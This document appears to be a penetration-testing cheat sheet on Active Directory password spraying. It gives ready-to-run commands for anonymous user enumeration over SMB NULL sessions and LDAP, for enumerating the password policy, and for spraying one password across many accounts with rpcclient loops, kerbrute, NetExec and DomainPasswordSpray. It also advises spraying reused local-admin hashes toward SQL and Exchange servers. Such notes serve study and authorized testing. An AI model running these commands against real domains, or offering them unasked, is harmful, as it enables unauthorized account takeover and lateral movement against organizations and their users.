**Overview:**
- Password spraying attempts a single common password against a large list of valid usernames, avoiding lockout by staying under the threshold. Requires knowing the domain password policy before attempting.
- SMB NULL sessions and LDAP anonymous binds are legacy misconfigurations that expose user lists and password policy to unauthenticated attackers.
- Default domain password policy sets lockout threshold to 0 (disabled), but never assume this. Always enumerate policy first to avoid locking out accounts.
- Valid user lists can be sourced from SMB NULL sessions, LDAP anonymous binds, Kerbrute enumeration, LinkedIn scraping, or hashes captured via Responder.
- Local administrator account password reuse is widespread due to gold image deployments. If a local admin hash or cleartext password is obtained, spray it across the network. Prioritize high-value hosts such as SQL and Exchange servers, as privileged users are more likely to be logged in or have credentials cached in memory.

**Default Password Policy:**

|Policy|Default Value|
|---|---|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Complexity requirements|Enabled|
|Reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset lockout counter after|Not set|

---
## User Enumeration

```bash
rpcclient -U "" -N <dc-ip>
```

Connect anonymously via SMB NULL session. Run `enumdomusers` inside the session to dump the full user list, `querydominfo` to retrieve domain info.

```bash
enum4linux -U <dc-ip> | grep "user:"
```

Enumerate users via SMB NULL session and filter output to usernames only.

```bash
nxc smb <dc-ip> --users
```

Enumerate domain users via NetExec without credentials.

```bash
./windapsearch.py --dc-ip <dc-ip> -u "" -U
```

Query LDAP anonymously to retrieve the user list. `-u ""` specifies anonymous access, `-U` retrieves users only. LDAP anonymous binds are disabled by default since Windows Server 2003 but still appear in legacy environments.

```bash
ldapsearch -h <dc-ip> -x -b "DC=<domain>,DC=<tld>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Raw LDAP anonymous query. Useful when windapsearch is unavailable or for manual inspection of attributes.

---
## Password Policy Enumeration

>**Linux:**

```bash
enum4linux -P <dc-ip>
```

Enumerate password policy via SMB NULL session. Use before spraying to determine lockout threshold.

```bash
nxc smb <dc-ip> -u <user> -p <password> --pass-pol
```

Retrieve password policy with valid credentials via NetExec. `--pass-pol` pulls lockout threshold, duration, and minimum password length.

>**Windows:**

```powershell
net accounts
```

Retrieve the domain password policy from a domain-joined Windows host. No additional tools required.

```powershell
net use \\<dc>\ipc$ "" /u:""
```

Establish an anonymous SMB NULL session from a Windows host. Used as a prerequisite for further enumeration via Windows-based tools.

---
## Password Spraying

>**Linux:**

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```bash
kerbrute passwordspray -d <domain> --dc <dc-ip> <valid-users-file> <password>
```

Spray a single password against a validated user list via Kerberos. Generates less noise than SMB-based spraying. `-d` specifies the domain, `--dc` specifies the domain controller IP.

```bash
sudo nxc smb <dc-ip> -u <valid-users-file> -p <password> | grep +
```

Spray via SMB from a Linux host. `grep +` filters output to successful authentications only.

>**Windows:**

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <password> -OutFile <out-file> -ErrorAction SilentlyContinue
```

Spray from a domain-joined Windows host. Omitting `-UserList` causes the tool to auto-generate the user list from the domain. `-OutFile` writes successful authentications to file. `-ErrorAction SilentlyContinue` suppresses failed attempt noise.